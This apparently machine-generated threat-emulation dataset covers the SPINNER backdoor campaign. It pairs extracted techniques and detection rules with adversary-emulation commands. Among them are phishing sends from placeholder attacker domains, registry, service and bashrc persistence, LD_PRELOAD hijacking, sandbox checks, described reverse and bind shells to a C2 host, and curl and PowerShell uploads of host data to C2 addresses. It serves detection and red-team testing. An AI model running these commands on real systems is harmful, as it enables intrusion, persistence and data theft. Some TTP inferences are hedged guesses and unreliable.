extracted_ttps.description: The attackers sent malicious emails with attachments to several defense research institutes based in Russia, attempting to trick the victims into opening the attachments and executing the malware.
The attackers used social engineering techniques, including phishing, to deliver a backdoor called SPINNER to specific targets.
Although not explicitly mentioned, the use of social engineering tactics like phishing could be inferred as the initial access vector for the TwistedPanda group.
Spear-phishing campaign using sanctions-related baits to attack Russian defense institutes
The attackers potentially used command-line tools like 'at', 'cmd', 'net', 'ping', and 'reg' to execute commands and interact with the system.
The attacker may have used phishing to gain initial access to the target system
The actors used the SPINNER backdoor to modify registry settings, although not explicitly mentioned, it can be inferred from the use of 'reg' tool
The attacker potentially used command line tools like 'at', 'cmd', 'net', 'ping', 'reg' for execution and scripting
The use of byte manipulation and stack strings could indicate reflective code loading techniques to evade defenses
The actors used complex compiler-level obfuscations to the SPINNER backdoor, reducing it to only basic functionality to increase stealth and evasion
The attacker may have relied on user interaction to execute malicious code, given the presence of potential malware and droppers
The malware uses cmdl32.exe to load the malicious DLL cmpbk32.dll, which is a technique used to execute commands and scripts on the victim's system.
The actors added more functionality to the DLL loader, handling different call reasons in DllMain to run malicious code stealthily in the background
The attacker used a dropper to execute a payload, which suggests user execution was involved
The attackers used phishing to gain initial access
The attackers used at and net commands, indicating the use of user execution techniques to execute system commands.
The attackers may have used the backdoor to collect information about the target systems, including application windows.
The actors used the SPINNER backdoor to send system information data and list logical drives
Detected Phishing activity via NLP pattern matching
The victim is tricked into opening a malicious document, which executes the malware and starts the infection chain.
The attackers relied on the targets to execute the backdoor, potentially through email attachments or links.
The attackers may have used the backdoor to discover files and directories on the target systems.
The attackers used a decryption routine, indicating the use of virtualization/sandbox evasion techniques to evade detection.
The SPINNER backdoor creates a new registry key 'OfficeInit' under 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run' to achieve persistence.
The malware uses compiler-level obfuscations, such as control flow flattening and opaque predicates, to make analysis difficult.
The SPINNER backdoor collects system information, including the computer name, local IP, Windows version, and username.
The attacker used decoy documents with Russian government-related themes to trick users into executing the malware
indicators: Decrees of the President of the Russian Federation

extracted_ttps.description: The attackers used cmd to execute commands, indicating the use of command and scripting interpreter techniques.

The attacker used VirtualAlloc to allocate memory and evade detection

The actors used the SPINNER backdoor to execute commands using cmd.exe

Malware communicates with the C&C through multiple threads

rules.title: Phishing via Office Process Spawning Shell with Malicious Domain
rules.description: Detects Office processes spawning command shells with command lines containing minzdravros[.]com domain, indicating potential malicious document execution.
falsepositives: Legitimate documents with embedded scripts contacting rare domains
Administrative macros using command-line tools for system management

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Execution of Native Windows Command-Line Utilities (at, cmd, net, ping, reg)
rules.description: Detects execution of Windows command-line interpreters and utilities that are commonly abused for scripting and system manipulation: at.exe, cmd.exe, net.exe, ping.exe, and reg.exe.

detection.condition: selection_at or selection_cmd or selection_net or selection_ping or selection_reg

falsepositives: Legitimate system administration using cmd.exe, net.exe, ping.exe, reg.exe or at.exe
Scheduled task creation via at.exe by authorized users
Network troubleshooting or configuration scripts run by IT staff

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect Registry Modification via reg.exe associated with SPINNER backdoor
rules.description: Detects execution of reg.exe with commands that modify the registry, especially when used by the SPINNER backdoor. Aligns with ATT&CK technique Modify Registry (T1112) for defense evasion.

detection.condition: selection_reg and (selection_add or selection_delete or selection_spinner)

falsepositives: System administrators running reg.exe for legitimate registry changes
Software installers or update mechanisms that use reg.exe
Windows Update processes invoking reg.exe

attacks.command: powershell -Command "$tempFile = \"$env:TEMP\\phish_test.txt\"; Set-Content -Path $tempFile -Value 'This is a test attachment.'; Send-MailMessage -From 'attacker@example.com' -To 'victim@example.com' -Subject 'Important Document' -Body 'Please see attached.' -SmtpServer 'smtp.example.com' -Attachments $tempFile"
attacks.description: Creates a simple text file in the TEMP directory and emails it as an attachment using PowerShell's Send-MailMessage, simulating a basic phishing email with attachment.
attacks.expected_behavior: A text file named phish_test.txt is created in %TEMP% and an email is sent to the victim address with the file attached. No execution occurs on the victim side.

attacks.command: powershell -Command "$vbs = \"$env:TEMP\\malicious.vbs\"; Set-Content -Path $vbs -Value 'Set oShell = CreateObject(\"WScript.Shell\"): oShell.Run \"calc.exe\",0'; Send-MailMessage -From 'phisher@evil.com' -To 'target@company.com' -Subject 'Invoice' -Body 'Please review the attached invoice.' -SmtpServer 'smtp.evil.com' -Attachments $vbs"
attacks.description: Generates a VBS script that launches Calculator when executed, then emails the script as an attachment, representing a typical malicious attachment used in phishing.
attacks.expected_behavior: A VBS file named malicious.vbs is placed in %TEMP% and sent via email. If the victim opens the attachment, Calculator will launch, demonstrating execution of a payload delivered through phishing.

attacks.command: powershell -Command "$vbs = \"$env:TEMP\\payload.vbs\"; Set-Content -Path $vbs -Value 'Set oShell = CreateObject(\"WScript.Shell\"): oShell.Run \"calc.exe\",0'; $b64 = \"$env:TEMP\\payload.b64\"; certutil -encode $vbs $b64 > $null; Send-MailMessage -From 'attack@bad.com' -To 'victim@target.com' -Subject 'Report' -Body 'See attached.' -SmtpServer 'smtp.bad.com' -Attachments $b64; Remove-Item $vbs -ErrorAction SilentlyContinue; Remove-Item $b64 -ErrorAction SilentlyContinue"
attacks.description: Creates a VBS payload, encodes it with certutil to a Base64 file, emails the encoded file as an attachment, and then cleans up the temporary files. This mimics advanced phishing where attackers hide malicious code via encoding.
attacks.expected_behavior: A VBS file is generated and encoded to payload.b64 in %TEMP%. An email containing the Base64 file is sent. After sending, both temporary files are deleted. If the victim decodes and runs the VBS, Calculator will launch.

attacks.command: mail -s "Important Update" -a /tmp/malicious.txt victim@example.com <<< "Please review the attached document."
attacks.description: Basic phishing email using the 'mail' command with an attachment flag to send a text file to the victim.
attacks.expected_behavior: An email with subject 'Important Update' and the file /tmp/malicious.txt attached is sent to victim@example.com.

attacks.command: echo "Please open the attached file." | mutt -s "Invoice Attached" -a /tmp/malicious.pdf -- victim@example.com
attacks.description: Intermediate phishing email using 'mutt' to attach a PDF file and set a custom subject line.
attacks.expected_behavior: Mutt sends an email to victim@example.com with subject 'Invoice Attached' and attaches /tmp/malicious.pdf, including the body text provided by echo.

attacks.command:
cat <<'EOF' | /usr/sbin/sendmail -t
From: attacker@malicious.com
To: victim@example.com
Subject: Your Account Statement
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset="UTF-8"

Please find your account statement attached.

--BOUNDARY
Content-Type: application/pdf; name="statement.pdf"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="statement.pdf"

$(base64 /tmp/malicious.pdf)

--BOUNDARY--
EOF
attacks.description: Advanced phishing email constructed manually with MIME headers and a base64‑encoded PDF attachment, piped into 'sendmail'.
attacks.expected_behavior: Sendmail processes the raw MIME message and delivers an email to victim@example.com containing a PDF attachment (base64‑encoded from /tmp/malicious.pdf) with the specified subject and body.

attacks.description: Executes a simple echo command via cmd.exe to create a test file in the temporary directory.
attacks.expected_behavior: A file named hello.txt containing the text 'HelloWorld' is created in the %TEMP% folder.

attacks.description: Schedules a one‑time task using the AT scheduler that runs a cmd.exe command to write a test file.
attacks.expected_behavior: At the specified time, the scheduled task runs and creates scheduled.txt in %TEMP% containing 'ScheduledTask'.

attacks.command: sc create TestSvc binPath= "cmd.exe /c \"echo ServiceCreated > %TEMP%\\svc.txt\"" start= auto && sc start TestSvc
attacks.description: Creates a new Windows service that runs a cmd.exe command to write a test file, then starts the service.
attacks.expected_behavior: A service named TestSvc is created and started; it executes cmd.exe which creates svc.txt in %TEMP% with the text 'ServiceCreated'.

attacks.description: Basic command execution using bash to write a file
attacks.expected_behavior: Creates a file named test.txt with the content 'Hello' in the current directory

attacks.description: Intermediate command scheduling using 'at' to execute a touch command
attacks.expected_behavior: Schedules a command to create a file named example in /tmp one minute from execution

attacks.command: bash -c 'for i in {1..5}; do touch file$i; done'
attacks.description: Advanced command execution using a bash loop to create multiple files
attacks.expected_behavior: Creates five files named file1 through file5 in the current directory

attacks.description: Adds a simple string value named TestValue under HKCU\Software\MyApp.
attacks.expected_behavior: The registry key HKCU\Software\MyApp will be created (if it does not exist) and the value TestValue set to 'TestData'. Verification can be done with 'reg query "HKCU\\Software\\MyApp" /v TestValue'.

attacks.command: reg add "HKCU\\Software\\MyApp\\Settings" /f && reg add "HKCU\\Software\\MyApp\\Settings" /v Enabled /t REG_DWORD /d 1 /f && reg add "HKCU\\Software\\MyApp\\Settings" /v Path /t REG_SZ /d "C:\\Temp" /f
attacks.description: Creates a sub‑key Settings under HKCU\Software\MyApp and adds two values: a DWORD Enabled=1 and a string Path='C:\Temp'.
attacks.expected_behavior: The Settings key will exist with the two specified values. Use 'reg query "HKCU\\Software\\MyApp\\Settings"' to view them.

attacks.description: Adds a Run key named TestRun under HKLM that launches notepad.exe at user logon, demonstrating persistence via registry modification.
attacks.expected_behavior: The value TestRun will be set to "%SystemRoot%\system32\notepad.exe". On next logon, Notepad will start automatically. Verify with 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestRun'.

attacks.description: Basic registry modification: adds a string value 'TestValue' with data 'test' under HKCU\Software\Demo.
attacks.expected_behavior: The specified value is created or overwritten in the current user's registry hive; no system-wide impact.

attacks.command: reg save HKLM\System /tmp/system.hiv && reg add "HKLM\System\CurrentControlSet\Services\Demo" /v Start /t REG_DWORD /d 4 /f && rm /tmp/system.hiv
attacks.description: Intermediate modification: backs up the HKLM System hive, adds a DWORD 'Start' with value 4 to disable a service, then removes the backup.
attacks.expected_behavior: Creates a backup of the system hive, modifies the service start type to disabled, and cleans up the backup file; requires root privileges.

attacks.command: while IFS= read -r key; do reg add "$key" /v Disabled /t REG_DWORD /d 1 /f; done < /tmp/keys.txt
attacks.description: Advanced modification: reads a list of registry keys from /tmp/keys.txt and sets a 'Disabled' DWORD value to 1 for each.
attacks.expected_behavior: Iterates over each key listed in the file, adding or updating the 'Disabled' value; useful for bulk disabling of components and requires appropriate privileges.

attacks.command: powershell -Command "$b64='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ; $bytes=[System.Convert]::FromBase64String($b64); [Reflection.Assembly]::Load($bytes) | Out-Null; Write-Host 'Assembly loaded in memory (reflective)';"
attacks.description: Loads a minimal dummy .NET assembly from a Base64 string directly into memory using Reflection.Assembly.Load, demonstrating basic reflective code loading.
attacks.expected_behavior: The PowerShell command decodes the Base64 string, loads the resulting byte array as an assembly in memory, and prints a confirmation message without writing any files to disk.

attacks.command: powershell -Command "$b64='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ; $tempFile=Join-Path $env:TEMP 'reflective.dll'; certutil -decode -f - > $tempFile 2>$null; $bytes=[IO.File]::ReadAllBytes($tempFile); [Reflection.Assembly]::Load($bytes) | Out-Null; Write-Host 'Reflectively loaded DLL from memory'; Remove-Item $tempFile -ErrorAction SilentlyContinue;"
attacks.description: Decodes a Base64 DLL to a temporary file, reads the file into a byte array, loads it reflectively, then cleans up the file, showing an intermediate reflective loading scenario.
attacks.expected_behavior: The command creates a temporary DLL file, loads its bytes into memory as an assembly, outputs a success message, and then deletes the temporary file silently.

attacks.description: Creates a C# in‑memory loader that writes a DLL byte array to a temporary file, loads it via LoadLibrary, deletes the file, and returns the module handle, illustrating an advanced reflective loading technique using P/Invoke.
attacks.expected_behavior: The PowerShell script defines a C# class that loads a DLL from a byte array, temporarily writes it to disk only for LoadLibrary, deletes the file, and reports the module handle, demonstrating reflective loading while minimizing disk artifacts.

attacks.description: Basic reflective load: uses Bash process substitution to create an in‑memory ELF header and passes its file descriptor (3) to LD_PRELOAD, avoiding any on‑disk library.
attacks.expected_behavior: The dummy_target attempts to load the ELF via LD_PRELOAD; loading fails due to an invalid library, confirming that the in‑memory file descriptor was used.

attacks.description: Intermediate reflective load: opens a new file descriptor from process substitution, assigns it to a variable, and points LD_PRELOAD at the /proc/self/fd path, keeping the ELF entirely in memory.
attacks.expected_behavior: dummy_target loads the ELF from the temporary descriptor; the load fails harmlessly, demonstrating reflective loading without a file on disk.

attacks.description: Advanced reflective load: creates a named pipe, streams a minimal ELF header into it in the background, and sets LD_PRELOAD to the pipe path, then cleans up the pipe after execution.
attacks.expected_behavior: The target process reads the ELF from the pipe via LD_PRELOAD; the load fails, but the flow shows code being supplied from a non‑persistent source.

attacks.description: Basic obfuscation using Base64-encoded string decoded with certutil
attacks.expected_behavior: Creates a file in %TEMP% named decoded.txt containing the decoded string 'test_payload'. Uses built-in certutil for decoding, simulating simple data obfuscation.

attacks.description: Intermediate obfuscation using hex-encoded data decoded via certutil -decodehex
attacks.expected_behavior: Decodes the hex string '746573745f6865785f64617461' into ASCII ('test_hex_data') and writes it to %TEMP%\hex_decoded.txt. Demonstrates use of less common certutil functionality for obfuscation.

attacks.description: Advanced obfuscation: Base64-encoded ZIP file written and extracted using PowerShell
attacks.expected_behavior: Decodes a Base64 string representing a ZIP archive into %TEMP%\test_zip.zip, then extracts it to %TEMP%\unzip_test. Simulates delivery of obfuscated payloads in compressed form. Uses only built-in PowerShell cmdlets with proper error handling and path safety.

attacks.description: Basic obfuscation: Base64-encode a simple command ('id') and execute it via shell.
attacks.expected_behavior: Decodes 'aWQ=' (which is 'id') and executes it, printing the current user's identity to stdout.

attacks.description: Intermediate obfuscation: Base64-encoded command writes a benign message to a file in $TMPDIR.
attacks.expected_behavior: Decodes and runs a command that writes 'this is test' to $TMPDIR/message.txt. File creation in temporary directory is expected.

attacks.description: Advanced obfuscation: Nested base64-encoded string containing trap and eval execution of a benign command.
attacks.expected_behavior: Sets up a trap for SIGHUP to echo a message, then silently executes 'pwd'. The use of eval and nested encoding increases complexity while remaining safe.

attacks.description: Creates a batch file that launches calc.exe and a desktop shortcut pointing to it; a user must click the shortcut to execute the payload.
attacks.expected_behavior: A file %TEMP%\malicious.bat containing "start calc.exe" is written, and a shortcut named Update.lnk appears on the user's Desktop. When the user double‑clicks the shortcut, calc.exe starts.

attacks.description: Writes a base64‑encoded batch script to %TEMP% and decodes it with certutil, producing a batch file that runs calc.exe; the user must execute the batch file.
attacks.expected_behavior: A file %TEMP%\malicious.bat is created containing "@echo off\r\nstart calc.exe". When the user runs this batch file, calc.exe launches.

attacks.description: Creates an HTA file in %TEMP% that runs calc.exe via VBScript; a user must open the HTA file (e.g., by double‑clicking) to trigger execution.
attacks.expected_behavior: A file %TEMP%\evil.hta is written containing a VBScript payload that runs calc.exe. When the user opens the HTA file (e.g., double‑click), calc.exe starts.

attacks.command: echo -e '#!/bin/bash\necho "Malicious payload executed"' > $HOME/tmp_malicious.sh && chmod +x $HOME/tmp_malicious.sh && echo "[+] Drop complete. Instruct user to run: $HOME/tmp_malicious.sh"
attacks.description: Drops a simple bash script into the user's home directory and relies on the user to manually execute it.
attacks.expected_behavior: A file $HOME/tmp_malicious.sh is created and marked executable; when the user runs it, it prints 'Malicious payload executed'.

attacks.command:
cat <<'EOF' > $HOME/Desktop/malicious.desktop
[Desktop Entry]
Type=Application
Name=Update Manager
Exec=$HOME/tmp_malicious.sh
Icon=system-run
Terminal=true
EOF
chmod +x $HOME/Desktop/malicious.desktop && echo "Malicious .desktop placed; user may double-click to execute script."
attacks.description: Creates a .desktop shortcut on the user's Desktop that points to the previously dropped script, prompting execution via a GUI double‑click.
attacks.expected_behavior: A file $HOME/Desktop/malicious.desktop is created and marked executable; when the user double‑clicks the icon, the script $HOME/tmp_malicious.sh runs and prints the payload message.

attacks.command: sudo bash -c 'echo -e "#!/bin/bash\necho \"Root-level malicious payload executed\" " > /usr/local/bin/malicious_root.sh && chmod +x /usr/local/bin/malicious_root.sh && echo "malicious_root.sh" >> /etc/bash.bashrc'
attacks.description: Installs a script in /usr/local/bin and appends its execution to the system-wide bashrc, causing it to run whenever a user opens a new shell.
attacks.expected_behavior: The script /usr/local/bin/malicious_root.sh is created and made executable; a line invoking it is added to /etc/bash.bashrc. On the next interactive shell start, the script runs and prints 'Root-level malicious payload executed'.

attacks.description: Preloads a 'malicious' library before running the ls command
attacks.expected_behavior: The ls command executes with the preloaded library, potentially executing malicious code.

attacks.description: Persists the preload configuration by writing to ld.so.preload
attacks.expected_behavior: All subsequent executions of dynamically linked binaries will preload the specified library, until the configuration is reverted.

attacks.description: Compiles a custom 'malicious' library and then preloads it
attacks.expected_behavior: The custom library is compiled and then preloaded before running the ls command, demonstrating an advanced scenario of hijacking the DLL search order.

attacks.description: Lists all windows being managed by the window manager.
attacks.expected_behavior: Displays a list of managed windows, including their window IDs and titles.

attacks.description: Searches for windows with the class 'firefox'.
attacks.expected_behavior: Returns the window IDs of all windows matching the specified class.

attacks.description: Activates the window with the title 'firefox' if it exists.
attacks.expected_behavior: Brings the specified window to the foreground if found.

attacks.description: Collect basic system information using the built‑in systeminfo utility and store it in a temporary file.
attacks.expected_behavior: Creates %TEMP%\\sysinfo.txt containing OS version, installed hotfixes, processor, memory, and other host details.

attacks.description: Enumerate logical drives and their free/total space using WMIC, outputting the results to a temporary file.
attacks.expected_behavior: Creates %TEMP%\\drives.txt listing each drive letter with its free and total size.

attacks.command: powershell -Command \"$info = systeminfo; $drives = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID,FreeSpace,Size; $data = $info + \\\"`n`n\\\" + ($drives | Out-String); $temp = \\\"$env:TEMP\\\\sysdata.txt\\\"; Set-Content -Path $temp -Value $data -Encoding ASCII; $zip = \\\"$env:TEMP\\\\sysdata.zip\\\"; Compress-Archive -Path $temp -DestinationPath $zip -Force; certutil -encode $zip $env:TEMP\\\\sysdata.b64\"
attacks.description: Gather systeminfo and drive details, combine them, compress into a zip archive, then encode the archive to Base64 using certutil to simulate staged exfiltration.
attacks.expected_behavior: Creates %TEMP%\\sysdata.txt with combined output, compresses it to %TEMP%\\sysdata.zip, and produces %TEMP%\\sysdata.b64 containing the Base64‑encoded zip file.

attacks.description: Gathers system information
attacks.expected_behavior: Displays system information including the kernel version, hostname, and other details

attacks.description: Lists logical drives and their information
attacks.expected_behavior: Displays a list of all available or mounted block devices, including their file system type, size, mount point, and label

attacks.description: Displays disk usage and file system types
attacks.expected_behavior: Shows the amount of disk space used and available on each mounted file system, including the file system type

attacks.description: Basic discovery using the native cmd.exe Dir command to list files and folders in the current user's Documents directory.
attacks.expected_behavior: Outputs a table of entries (files and sub‑folders) located in %USERPROFILE%\Documents, similar to the standard Dir output.

attacks.description: Intermediate discovery using PowerShell to list only files (no recursion) in the user's AppData\Roaming folder, showing each file's name and size.
attacks.expected_behavior: Prints a list of file names and their byte sizes from the %APPDATA% directory.

attacks.description: Advanced discovery using PowerShell to enumerate hidden files in the System32 directory without recursion, demonstrating use of the -Force flag and attribute filtering.
attacks.expected_behavior: Displays the names and attribute flags of hidden files located directly in C:\Windows\System32.

attacks.description: List all files and directories in /home to discover user directories and potential sensitive files.
attacks.expected_behavior: Outputs a detailed list of user directories and hidden files in /home. No changes are made to the system.

attacks.description: Search for configuration files with .conf extension in /etc directory to identify system and service configurations.
attacks.expected_behavior: Prints paths of .conf files in /etc. Errors from permission-denied are suppressed. Safe and non-invasive.

attacks.description: Search user's home directory for files containing 'password' or 'key' in the name and save results to a hidden cache file.
attacks.expected_behavior: Creates a hidden directory and file to store discovery results. Searches for sensitive filenames. No system modification beyond output file creation in user directory.

attacks.command: cmd.exe /c "wmic computersystem get model | findstr /i \"Virtual\" && echo Detected virtualization && exit /b"
attacks.description: Basic check using WMIC to retrieve the system model and grep for the keyword 'Virtual'. If found, prints a detection message and exits, simulating sandbox evasion.
attacks.expected_behavior: Outputs the system model; if the model contains 'Virtual' (e.g., VirtualBox, VMware), the command echoes a detection message and terminates with exit code 0.

attacks.command: powershell -Command "Get-WmiObject Win32_ComputerSystem | Where-Object { $_.Manufacturer -match 'VMware|Virtual' } | ForEach-Object { Write-Output 'Virtual environment detected' }"
attacks.description: Intermediate PowerShell query of Win32_ComputerSystem to check the Manufacturer field for common virtualization strings. Emits a message when a virtual environment is identified.
attacks.expected_behavior: If the Manufacturer contains 'VMware' or 'Virtual', the command prints 'Virtual environment detected'; otherwise, it produces no output.

attacks.command: powershell -Command "Get-ItemProperty -Path 'HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS' -Name 'SystemManufacturer' -ErrorAction SilentlyContinue | ForEach-Object { if ($_.SystemManufacturer -match 'VMware|Virtual') { Write-Output 'Virtual BIOS detected' } }"
attacks.description: Advanced check reading the BIOS SystemManufacturer registry value to spot virtualization signatures. Uses silent error handling to avoid raising alerts if the key is missing.
attacks.expected_behavior: When the BIOS manufacturer string matches known virtualization identifiers, the command outputs 'Virtual BIOS detected'; otherwise, it remains silent.

attacks.command: hostname | grep -E '(sandbox|vm|virtual)' && echo "Running in a virtualized environment" || echo "Proceeding with execution"
attacks.description: Basic virtualization evasion check by inspecting the hostname for common sandbox or VM indicators.
attacks.expected_behavior: If the hostname contains 'sandbox', 'vm', or 'virtual', it outputs a detection message; otherwise, it proceeds.

attacks.command: grep -i 'vendor_id' /proc/cpuinfo | grep -E '(innotek|qemu|kvm)' && echo "Virtual environment detected" || echo "System appears physical"
attacks.description: Intermediate check using CPU vendor ID in /proc/cpuinfo to detect virtualization providers like QEMU, KVM, or VirtualBox.
attacks.expected_behavior: Outputs a detection message if virtualization-related CPU vendor strings are found; otherwise, indicates the system appears physical.

attacks.command: df --block-size=1M / | tail -1 | awk '{if ($2 < 20480) print "Low disk space: likely sandbox"; else print "Sufficient disk space: continuing"}'
attacks.description: Advanced evasion technique checking root filesystem size; small disk size may indicate a sandboxed environment.
attacks.expected_behavior: If the root filesystem is less than 20GB, it assumes a sandbox; otherwise, continues execution.

attacks.description: Basic system discovery using the built‑in systeminfo utility to collect OS version, build number, system manufacturer, and hardware details.
attacks.expected_behavior: Outputs a multi‑line summary of the operating system, processor, memory, and other system attributes to the console.

attacks.description: Intermediate discovery using WMIC to enumerate all logical disks, reporting each drive's name, total size, and free space.
attacks.expected_behavior: Prints a table listing each drive (e.g., C:, D:) with its size in bytes and available free space.

attacks.command: powershell -Command "Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, Size, FreeSpace | Out-File -FilePath $env:TEMP\diskinfo.txt"
attacks.description: Advanced discovery: PowerShell queries WMI for detailed disk information and writes the output to a temporary file for later analysis.
attacks.expected_behavior: Creates a file named diskinfo.txt in the %TEMP% directory containing a list of disks with IDs, volume names, total size, and free space.

attacks.description: Advanced file discovery: PowerShell enumerates files in the %TEMP% folder, selects the five largest, and writes their names and sizes to a temporary report.
attacks.expected_behavior: Generates a file named largest_files.txt in %TEMP% listing the top five largest files (name and size) present in the temporary directory.

attacks.description: Basic system information discovery: prints kernel version, hostname, and OS release details.
attacks.expected_behavior: The command outputs a single line with kernel name, version, and architecture, followed by the contents of /etc/os-release showing distribution name and version.

attacks.description: Intermediate discovery: reports filesystem usage and enumerates block devices with size and mount points.
attacks.expected_behavior: First part lists each mounted filesystem with human‑readable sizes. Second part lists block devices (e.g., sda, sdb) with their sizes, type (disk, part), and mount points.

attacks.description: Basic TLS beacon using OpenSSL's s_client to connect to the C2 server and send a simple string.
attacks.expected_behavior: Opens a TLS connection to c2.example.com on port 443, sends the string "PING", then closes the connection.

attacks.description: Intermediate C2 communication using curl with mutual TLS authentication to POST a timestamp beacon.
attacks.expected_behavior: Establishes a TLS session with client certificate authentication, sends an HTTP POST containing a timestamp, and receives the server's HTTP response.

attacks.description: Advanced persistent TLS tunnel using socat that forwards an interactive bash shell over an encrypted channel.
attacks.expected_behavior: Creates a TLS listener to c2.example.com:443, disables certificate verification, and spawns an interactive bash shell whose I/O is tunneled over the encrypted connection.

attacks.command: copy "%SystemRoot%\System32\notepad.exe" "%TEMP%\rekeywiz.exe" && sc create InterSys binPath= "%TEMP%\rekeywiz.exe" start= auto
attacks.description: Creates a dummy executable (rekeywiz.exe) in the temp folder and registers a new Windows service named InterSys that runs it, set to start automatically.
attacks.expected_behavior: The service InterSys appears in the Services MMC snap‑in and will start on boot, executing the copied notepad.exe as a placeholder.

attacks.description: Copies a benign executable to %TEMP% and creates a scheduled task named InterSys that runs it at every user logon with highest privileges.
attacks.expected_behavior: The task InterSys is listed via schtasks /Query and will launch the placeholder executable each time a user logs on.

attacks.command: powershell -Command "Copy-Item -Path $env:SystemRoot\System32\notepad.exe -Destination $env:TEMP\rekeywiz.exe -Force; New-Service -Name 'InterSys' -BinaryPathName '$env:TEMP\rekeywiz.exe' -Description 'Test service for persistence' -StartupType Automatic"
attacks.description: Uses PowerShell to copy notepad.exe to the temp directory and creates a new service InterSys that runs the copied file, set to start automatically.
attacks.expected_behavior: A new service called InterSys is registered and appears in the service list; it will launch the placeholder executable on system start.

attacks.command:
printf '[Unit]
Description=InterSys Service
[Service]
ExecStart=/usr/bin/sleep 300
[Install]
WantedBy=multi-user.target
' | sudo tee /etc/systemd/system/inter_sys.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable --now inter_sys.service
attacks.description: Creates a systemd unit file for a service named inter_sys that runs 'sleep 300', reloads the daemon, and enables/starts the service.
attacks.expected_behavior: A new systemd service 'inter_sys.service' appears, is enabled to start at boot, and runs the sleep command in the background.

attacks.command:
sudo bash -c 'cat > /etc/init.d/inter_sys <<EOF
#!/bin/sh
# Provides: inter_sys
# Required-Start: $remote_fs $syslog
# Required-Stop: $remote_fs $syslog
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
# Short-Description: InterSys service

case "$1" in
  start)
    /usr/bin/sleep 300 &
    ;;
  stop)
    pkill -f "sleep 300"
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
    ;;
esac
exit 0
EOF
chmod +x /etc/init.d/inter_sys && update-rc.d inter_sys defaults'
attacks.description: Writes a SysV init script to /etc/init.d/inter_sys that runs 'sleep 300' on start, registers it with update-rc.d to start at default runlevels.
attacks.expected_behavior: An init script 'inter_sys' is installed, marked executable, and linked into the appropriate rc.d directories, causing the sleep command to start on system boot.

attacks.description: Creates a transient systemd service named inter_sys that runs 'sleep 300' without a persistent unit file.
attacks.expected_behavior: A transient service 'inter_sys.service' appears in 'systemctl list-units', runs the sleep command, and exits after 300 seconds.

attacks.command: echo 'echo "Test from at job"' | at now + 1 minute
attacks.description: Uses the signed 'at' binary to schedule a benign echo command that will run in one minute, demonstrating proxy execution via a legitimate scheduler.
attacks.expected_behavior: After one minute, the scheduled job runs and outputs 'Test from at job' (typically emailed to the user or printed to the console).

attacks.command: printf '#!/bin/bash\necho "Intermediate at job executed"\n' > /tmp/intermediate.sh && chmod +x /tmp/intermediate.sh && at now + 2 minutes <<< "/tmp/intermediate.sh"
attacks.description: Creates a temporary script in /tmp and uses 'at' to schedule its execution, showing how a signed binary can proxy the execution of a custom script.
attacks.expected_behavior: Two minutes later the script runs, printing 'Intermediate at job executed' to the user's mail or console.

attacks.description: Starts a netcat listener on a non‑privileged port that executes /bin/bash for any incoming connection, using the signed netcat binary as a proxy for command execution.
attacks.expected_behavior: Netcat runs in the background listening on port 12345; when a client connects, it receives an interactive shell.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: Capture network configuration and send via HTTP PUT using certutil
attacks.expected_behavior: Runs ipconfig to collect network details, saves to a temp file, then uploads it to a specified C2 server using certutil. Leaves no persistent artifacts.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: systeminfo > "%TEMP%\host_info.txt" && whoami >> "%TEMP%\host_info.txt" && ipconfig /dnsflush > "%TEMP%\dns_flush.log" 2>&1 && powershell -Command "Invoke-WebRequest -Uri 'http://192.168.100.10/exfil.php' -Method POST -InFile '%TEMP%\host_info.txt' -ErrorAction SilentlyContinue; Remove-Item '%TEMP%\host_info.txt' -ErrorAction SilentlyContinue"
attacks.description: Intermediate exfiltration: Gather system and user info, send via POST request, and clean up
attacks.expected_behavior: Collects system and user information into a file, sends it to a C2 endpoint via HTTPS POST, then deletes the local file. Uses built-in binaries and PowerShell only for upload and cleanup.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: mkdir "%TEMP%\exfil" -ErrorAction SilentlyContinue & systeminfo > "%TEMP%\exfil\sys.txt" & echo test_data > "%TEMP%\exfil\extra.txt" & powershell -Command "Compress-Archive -Path '%TEMP%\exfil\*' -DestinationPath '%TEMP%\payload.zip' -Force; $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP%\payload.zip')); Invoke-WebRequest -Uri 'http://192.168.100.10/api' -Method POST -Body $encoded -ContentType 'text/plain'; Remove-Item '%TEMP%\exfil' -Recurse -ErrorAction SilentlyContinue; Remove-Item '%TEMP%\payload.zip' -ErrorAction SilentlyContinue"
attacks.description: Advanced exfiltration: Collect and compress multiple files, encode in Base64, and exfiltrate via POST
attacks.expected_behavior: Creates a temporary directory, gathers system data, compresses files into a ZIP archive, encodes it in Base64, sends it to a C2 server, then removes all traces. Uses PowerShell for compression and encoding only where necessary.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: echo 'test system info' > /tmp/sysinfo.txt && curl -X POST http://192.168.0.10:8080/exfil --data-binary @/tmp/sysinfo.txt
attacks.description: Basic exfiltration: creates a test file and sends it to a C2 server using curl
attacks.expected_behavior: Creates a small test file in /tmp and uploads it to the specified server via HTTP POST. Fails silently if server is unreachable.

attacks.technique_name: Exfiltration Over Command and Control Channel
